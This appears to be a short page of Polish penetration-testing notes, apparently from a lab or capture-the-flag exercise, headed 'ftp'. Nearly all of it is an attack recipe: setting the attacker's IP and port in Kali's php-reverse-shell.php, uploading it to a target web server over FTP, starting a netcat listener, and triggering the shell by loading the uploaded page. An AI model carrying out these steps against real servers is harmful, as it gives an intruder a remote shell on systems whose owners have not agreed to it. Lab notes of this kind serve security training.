---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# ftp

{% code fullWidth="true" %}
```python
#folder z payloadami php do ataku na strony internetowe
/usr/share/webshells/php

#plik php-reverse-shell.php
vim php-reverse-shell.php
$ip = 172.15.0.28  -> adres Kaliego
$port = 1234

#łaczymy się z ftp strony www
ftp 172.15.0.11

#uploadujemy skrypt php
put php-reverse-shell.php

#wystawiamy listenera
nc -nlvp 1234

#uruchamiamy skrypt poprzez wejście na stronę http://172.15.0.11/php-reverse-shell.php
```
{% endcode %}
